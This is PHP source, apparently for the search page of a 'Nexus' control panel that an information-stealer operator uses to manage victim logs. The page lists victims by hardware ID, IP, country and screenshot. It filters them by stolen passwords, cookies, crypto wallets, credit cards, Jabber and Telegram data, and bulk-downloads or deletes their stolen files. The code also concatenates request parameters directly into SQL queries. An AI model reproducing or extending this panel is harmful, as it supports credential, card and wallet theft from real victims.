<?php 
   session_start();
   include 'database.php';
	require_once("auth.php");
   if(isset($_GET["download"])) $download = formatString($_GET["download"]);
   if(isset($_GET["check"])) $check = formatString($_GET["check"]);
   if(isset($_GET["delete"])) $delete = formatString($_GET["delete"]);
   if(isset($_GET["comment"])) $comment = formatString($_GET["comment"]);
   if($comment!=null){
	   $id = formatString($_GET['id']);
	   $pdoConnection->query("UPDATE `logs` SET `comment` = '$comment' WHERE `id` = '$id'");
	   header("Location: search.php", true, 301);
   }
   if ($download != null) {
  if(strpos($download,',')!==false){
		$ids = explode(',',$download);
		   $txt    = "logs/".(count($ids)-1) ." Logs ". date("d.m.Y_H:i:s") . ".zip";
        $zipAll = new ZipArchive();
        $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        for($i=0;$i<count($ids)-1;$i++){
			$pc = $pdoConnection->query("SELECT hwid, ip, country, date FROM `logs` WHERE `id`=".$ids[$i])->fetch(PDO::FETCH_ASSOC);
            $rootPath = realpath("logs/" . $pc["hwid"] . "/");
			if(file_exists($rootPath)){
            $files    = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);
            
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath     = $file->getRealPath();
                    $str          = date("d.m.Y_H:i:s", $pc["date"]) . "_" . $pc["country"] . "_" . $pc["ip"] . "_" . $pc["hwid"];
					$relativePath = substr($filePath, strlen($rootPath) + 1);
					$zipAll->addFile($filePath, $str . "/" . $relativePath);
                }
            }
            $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc["hwid"]."'");
			}
        }
        $zipAll->close();
        header("Location: " . $txt);
	   }else{
       $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
       $ip = $pdoConnection->query("SELECT ip FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
$country = $pdoConnection->query("SELECT country FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
		$datee = $pdoConnection->query("SELECT date FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
		$str          = date("d.m.Y_H:i:s", $datee) . "_" . $country . "_" . $ip . "_" . $hwid;
       $txt = "logs/" .$str. ".zip";
       $rootPath = realpath("logs/" . $hwid . "/");
       $zip = new ZipArchive();
       $zip->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
       $zip->setArchiveComment(file_get_contents("logs/" . $hwid . "/information.log"));
   
       $files = new RecursiveIteratorIterator(
           new RecursiveDirectoryIterator($rootPath),
           RecursiveIteratorIterator::LEAVES_ONLY
       );
   
       foreach ($files as $name => $file) {
           if (!$file->isDir()) {
               $filePath = $file->getRealPath();
               
				$relativePath = substr($filePath, strlen($rootPath) + 1);
				$zip->addFile($filePath,$relativePath);
           }
       }
   
   
       $zip->close();
	   $pdoConnection->query("UPDATE `logs` SET `checked` = '1' WHERE `hwid` = '$hwid'");
       header("Location: ". $txt);   
       exit;
	   }
   }
   if ($delete != null) {
       if(strpos($delete,',')!==false){
		   $ids = explode(',',$delete);
		   for($i=0;$i<count($ids)-2;$i++){
			   try{
		   $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . formatString($ids[$i]) . "'")->fetchColumn(0);
           $dir = "logs/" . $hwid . "/";
		   if(strlen($dir)>6){
           $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
           $files = new RecursiveIteratorIterator($it,
               RecursiveIteratorIterator::CHILD_FIRST);
           foreach ($files as $file) {
               if ($file->isDir()) {
                   rmdir($file->getRealPath());
               } else {
                   unlink($file->getRealPath());
               }
           }
           rmdir($dir);  
		   }
       } catch (Exception $ex) {
       }
       $pdoConnection->exec("DELETE FROM `logs` WHERE id = '" . $ids[$i] . "'");
		   }
	   }else{
       try {  
           $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . formatString($delete) . "'")->fetchColumn(0);
           $dir = "logs/" . $hwid . "/";
		   if(strlen($dir)>6){
           $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
           $files = new RecursiveIteratorIterator($it,
               RecursiveIteratorIterator::CHILD_FIRST);
           foreach ($files as $file) {
               if ($file->isDir()) {
                   rmdir($file->getRealPath());
               } else {
                   unlink($file->getRealPath());
               }
           }
           rmdir($dir);  
		   }
       } catch (Exception $ex) {
       }
       $pdoConnection->exec("DELETE FROM `logs` WHERE id = '" . $delete . "'");
	   }
	   header("Location: search.php", true, 301);
   }
   
   if ($check != null) {
       $pdoConnection->exec("UPDATE `logs` SET checked = 1 WHERE id = '" . $check . "'");
   }

   
   ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Nexus:Search</title>
  <!-- plugins:css -->
      <script src="js/jquery.js"></script>
	  <script src="js/datatables.min.js"></script>
	  <link rel="stylesheet" href="css/switch.css">
	  <link rel="stylesheet" href="css/viewbox.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
     <link id="style" rel="stylesheet" href="css/<?php if($_COOKIE["nightmode"]=="true") echo "dark";?>style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="images/favicon.png" />
</head>

<body>
  <div class="container-scroller">
   <?php include "partials/_navbar.php";?>
    <div class="container-fluid page-body-wrapper">
      <div class="main-panel">
        <div class="content-wrapper">
		
		<div class="col-12">
              <div class="card">
                <div class="card-body">
                  <form class="form-search">
                      <div class="form-group">
                          <label style="display:none;" >ID</label>
                          <select style="display:none;" class="form-control" name="search_id">
                              <option value="all" selected="">All</option>
                              <?php
                              $userIDs = $pdoConnection->query("SELECT userID FROM `logs` GROUP BY userID");
                              while ($userID = $userIDs->fetch(PDO::FETCH_ASSOC))
                              {
                                  echo '<option value="'.$userID["userID"].'">'.$userID["userID"]."</option>";
                              }
                              ?>
                          </select>
                      </div>
				  <div class="form-group">
                      <label>Preset</label>
                      <select class="form-control" name="search_type">
											<option value="all" selected="">All</option>
											<?php
											$presets = $pdoConnection->query("SELECT * FROM `presets`");
											while ($preset = $presets->fetch(PDO::FETCH_ASSOC))
											{
												echo '<option value="'.$preset["name"].'">'.$preset["name"]."</option>";
											}
											?>
						</select>
                    </div>
                    <div class="form-group">
                      <label for="exampleInputUsername1">Country</label>
                      <input type="text" class="form-control" value="<?php echo $search_country;?>" name="search_country">
                    </div>

                    <tr>
                        <th>
                    <div class="form-group">
                      <label for="exampleInputEmail1">Commentary</label>
                      <input type="text" class="form-control" value="<?php echo $search_comment;?>" name="search_comment">
                    </div></th>
                        <th>
                    <div class="form-group">
                      <label for="exampleInputPassword1">Search link in passwords</label>
                      <input type="text" placeholder="separate with ;" class="form-control" value="<?php echo $search_in_passwords;?>" name="search_in_passwords">
                    </div>
                        </th>
                    </tr>
                    <div class="form-group">
                      <label for="exampleInputConfirmPassword1">Search link in cookies</label>
                      <input type="text" placeholder="separate with ;" class="form-control" value="<?php echo $search_in_cookies;?>" name="search_in_cookies">
                    </div>
					<div style="float: left;
    width: 25%;">
                    <div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_pass" class="form-check-input">
                        With passwords
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_cookie" class="form-check-input">
                        With cookies
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_wallet" class="form-check-input">
                        With wallets
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_cc" class="form-check-input">
                        With CC
                      </label>
                    </div></div>
					<div style="float: left;
    width: 25%;">
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_jabb" class="form-check-input">
                        With jabber
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_tg" class="form-check-input">
                        With telegram
                      </label>
                    </div>
					<div class="form-check form-check-flat form-check-primary">
                      <label class="form-check-label">
                        <input type="checkbox" name="search_unchecked" class="form-check-input">
                        Unchecked
                      </label>
                    </div></div>
					<div style="clear:both;">
					<center>
                    <button type="button" onclick="search()" class="btn btn-primary mr-2">Search</button>
					</center>
					</div>
                  </form>
                </div>
              </div>
            </div>
		<div class="col-12 grid-margin">
		  <div class="card">
            <div class="card-body">
                <div class="col-12 table">
				<div style = "padding-bottom: 1rem;">
						<center>
						<a id="chkbxdown" href="#!" onclick="downloadSelected()" class="btn btn-info btn-sm">Download</a>
						<a id="chkbx" href="#!" onclick="deleteSelected()" class="btn btn-info btn-sm">Delete</a>
						</center>
					</div>
					<center><a id='totalCount' href='#'>Printed 0 logs</a></center>
                  <table id="logs-listing" class="table">
                    <thead>
                      <tr>
									<th style="display:none;" >ID</th>
                                    <th style="width: 25%;">Metadata</th>
                                    <th>SysInfo</th>
                                    <th>IP/Country</th>
                                    <th>Date</th>
                                    <th>Ver</th>
                                    <th>Screenshot</th>
									<th>Commentary</th>
                                    <th>More</th>
                      </tr>
                    </thead>
                    <tbody></tbody>
                  </table>
				  </div>
				   <!--<nav style="margin-top: 10px;">
                        <ul class="pagination mx-auto justify-content-center">
                           <li class="page-item">
                              <a class="page-link" href="index.php?p=<?php  echo $past; ?>">
                              <span>Previous</span>
                              </a>
                           </li>
                           <?php 
                              if ($p != "") {
                                  if ($p != "1") {
                                      ?>
                           <li class="page-item"><a class="page-link"
                              href="index.php?p=<?php  echo $p - 1; ?>"><?php  echo $p - 1; ?></a>
                           </li>
                           <?php 
                              }
                              }
                              
                              ?>
                           <li class="page-item"><a class="page-link" href="#"><?php  if ($p == null) {
                              echo "1";
                              } else {
                              echo $p;
                              } ?></a></li>
                           <li class="page-item"><a class="page-link"
                              href="index.php?p=<?php  echo $p + 1; ?>"><?php  echo $p + 1; ?></a>
                           </li>
                           <li class="page-item">
                              <a class="page-link" href="index.php?p=<?php  echo $next; ?>">
                              <span>Next</span>
                              </a>
                           </li>
                        </ul>
                     </nav>-->
              </div>
            </div>
          </div>
		   </div>
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
<script>
	  function toggleCheckbox(id)
		 {
		var element = document.getElementById(id);
		   element.checked = !element.checked;
		   blink(element);
		   var logs = "";
		var checkboxes = document.getElementsByClassName('invcheckbox');
		for (var index = 0; index < checkboxes.length; index++)
		{
			 if (checkboxes[index].checked)
			 {
				logs = logs + "" + checkboxes[index].id + ",";
			 }
		  }
		  document.getElementById('chkbxdown').href="index.php?download="+logs;
		  document.getElementById('chkbx').href="index.php?delete="+logs;
		 }
		 function SelectDeselectAll(id)
		 {
		var checkboxes = document.getElementsByClassName('invcheckbox');
		var logs="";
		for (var index = 0; index < checkboxes.length; index++)
		{
			checkboxes[index].checked = !checkboxes[index].checked;
			if(checkboxes[index].checked) logs = logs + "" + checkboxes[index].id + ",";
			blink(checkboxes[index]);
		  }
		  document.getElementById('chkbxdown').href="index.php?download="+logs;
		  document.getElementById('chkbx').href="index.php?delete="+logs;
		 }
		  function blink(elem)
		 {
			var checkbox = elem;
			var table = document.getElementById(elem.id+'table');
			if(checkbox.checked){
				if(sessionStorage.getItem("nightmode")!="true"){
					table.style.backgroundColor='aliceblue';
				}else{
					table.style.backgroundColor='#3c4b58';
				}
				
			}else{
				table.style.backgroundColor='';
			}
		 }
	  </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
      integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"
      crossorigin="anonymous"></script>
	     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
      integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
      crossorigin="anonymous"></script>
	  	  <script src="js/main.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <!-- End custom js for this page-->
</body>

</html>
